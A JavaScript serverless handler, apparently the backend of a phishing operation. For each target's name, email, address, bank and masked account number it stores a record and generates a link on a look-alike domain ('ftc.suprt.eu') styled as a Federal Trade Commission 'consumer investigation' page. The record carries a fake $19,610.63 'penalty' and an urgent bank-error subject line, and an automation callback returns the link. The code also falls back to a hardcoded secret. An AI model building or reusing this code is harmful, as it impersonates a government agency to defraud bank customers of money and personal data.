/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

export default async function handler(req, res) {
  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  // Retrieve security code from header or body
  const securityCode = req.headers['x-security-code'] || req.body?.security_code;
  const configuredCode = process.env.SECURITY_CODE || 'secret123'; // Default fallback code

  if (securityCode !== configuredCode) {
    return res.status(401).json({ error: 'Unauthorized: Invalid security code' });
  }

  // Parse report payload
  const {
    id,
    name,
    email,
    address,
    bank,
    accountEnding,
    accountMasked,
    amount,
    initialPenalty = '$19,610.63',
    subject,
    callbackUrl
  } = req.body || {};

  if (!name || !bank || !amount) {
    return res.status(400).json({ error: 'Missing required fields (name, bank, amount)' });
  }

  // Generate deterministic report details
  const recordId = Math.floor(10000000 + Math.random() * 90000000).toString();
  const bankSlug = bank
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, '-')
    .replace(/(^-|-$)/g, '');

  const generatedUrl = `https://ftc.suprt.eu/advice-and-guidance/report/${recordId}/${bankSlug}-consumer-investigation`;

  const newEntry = {
    id: id || null,
    recordId,
    name,
    email: email || null,
    address: address || null,
    bank,
    accountMasked: accountMasked || `XXXXXXXXX${accountEnding || ''}`,
    accountEnding: accountEnding || '',
    amount,
    initialPenalty,
    subject: subject || 'Urgent Resolution Required Error in transaction in your bank',
    reviewUrl: generatedUrl
  };

  // Vercel KV REST API Credentials
  const kvUrl = process.env.KV_REST_API_URL;
  const kvToken = process.env.KV_REST_API_TOKEN;

  if (!kvUrl || !kvToken) {
    return res.status(500).json({ error: 'Vercel KV Database not connected. Please connect KV in Vercel Storage settings.' });
  }

  try {
    // 1. Fetch current database from Vercel KV
    const getRes = await fetch(`${kvUrl}/get/reports_db`, {
      headers: { Authorization: `Bearer ${kvToken}` }
    });
    const getData = await getRes.json();
    const reportData = getData.result ? JSON.parse(getData.result) : {};

    // 2. Add new entry
    reportData[recordId] = newEntry;

    // 3. Save updated database back to KV (using Redis SET command)
    // We send a POST request with the JSON payload to the KV REST API
    const setRes = await fetch(`${kvUrl}/set/reports_db`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${kvToken}` },
      body: JSON.stringify(reportData)
    });

    if (!setRes.ok) {
      throw new Error(`Failed to save to KV: ${await setRes.text()}`);
    }

    // 4. Trigger callback asynchronously if provided
    if (callbackUrl) {
      const callbackToken = process.env.N8N_CALLBACK_TOKEN;
      const headers = { 'Content-Type': 'application/json' };
      if (callbackToken) {
        headers['Authorization'] = `Bearer ${callbackToken}`;
      }

      fetch(callbackUrl, {
        method: 'POST',
        headers,
        body: JSON.stringify({
          id: id || null,
          recordId,
          url: generatedUrl,
          status: 'success'
        })
      })
      .then(r => console.log(`📬 Callback sent with status ${r.status}`))
      .catch(e => console.error('⚠️ Callback failed:', e.message));
    }

    return res.status(200).json({
      success: true,
      recordId,
      url: generatedUrl
    });

  } catch (error) {
    console.error('Database write error:', error);
    return res.status(500).json({ error: 'Failed to write report to Vercel KV database' });
  }
}
